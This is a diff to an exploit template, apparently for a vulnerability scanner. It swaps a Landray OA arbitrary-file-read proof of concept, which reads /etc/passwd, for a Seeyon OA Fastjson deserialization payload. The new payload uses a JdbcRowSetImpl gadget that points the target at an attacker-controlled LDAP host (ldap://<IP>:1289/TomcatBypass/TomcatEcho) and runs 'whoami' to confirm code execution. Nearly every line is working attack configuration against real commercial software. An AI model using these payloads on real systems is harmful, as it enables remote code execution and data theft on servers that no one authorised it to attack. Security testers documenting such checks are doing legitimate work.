@@ -1,18 +1,18 @@
 #poc名称
 - name:
-  - name: "LandrayOA_arbitrary_file_read"
+  - name: "SeeyouOA_Fastjson_Deserialization"
 
 #请求方式
 - method:
   - method: "post"
-
+  
 #漏洞的位置
 - url:
-  - url : "/sys/ui/extend/varkind/custom.jsp"
+  - url : "/seeyon/main.do?method=changeLocale"
 
 #payload
 - payload:
-  - payload: 'var={"body":{"file":"file:///etc/passwd"}}'
+  - payload: '_json_params={"v47":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"xxx":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<IP>:1289/TomcatBypass/TomcatEcho","autoCommit":true}}'
 
 #response包里状态码
 - status:
@@ -21,7 +21,7 @@
 #response包里的关键字
 - word:
   - word:
-      - "bin"
+      - "root"
 
 #验证是否攻击成功的 请求方式
 - method-V:
@@ -33,4 +33,4 @@
 
 #cmd 为了适配Java反序列化漏洞
 - cmd:
-  - cmd : "isNone"
+  - cmd : "whoami"
